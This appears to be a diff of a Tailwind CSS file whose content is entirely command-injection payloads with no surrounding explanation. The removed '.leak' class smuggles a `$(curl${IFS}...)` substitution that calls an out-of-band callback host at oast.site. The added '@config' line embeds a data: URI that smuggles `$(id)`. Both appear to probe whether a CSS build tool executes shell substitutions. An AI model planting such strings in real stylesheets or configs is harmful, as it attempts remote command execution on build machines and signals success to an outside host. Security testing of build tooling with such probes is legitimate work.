@@ -1,6 +1,1 @@
-@tailwind base;
-@layer utilities {
-  .leak {
-    content: "`$(curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site`";
-  }
-}
+@config "data:application/json,{\"content\":[\"!`$(id)`\"]}";
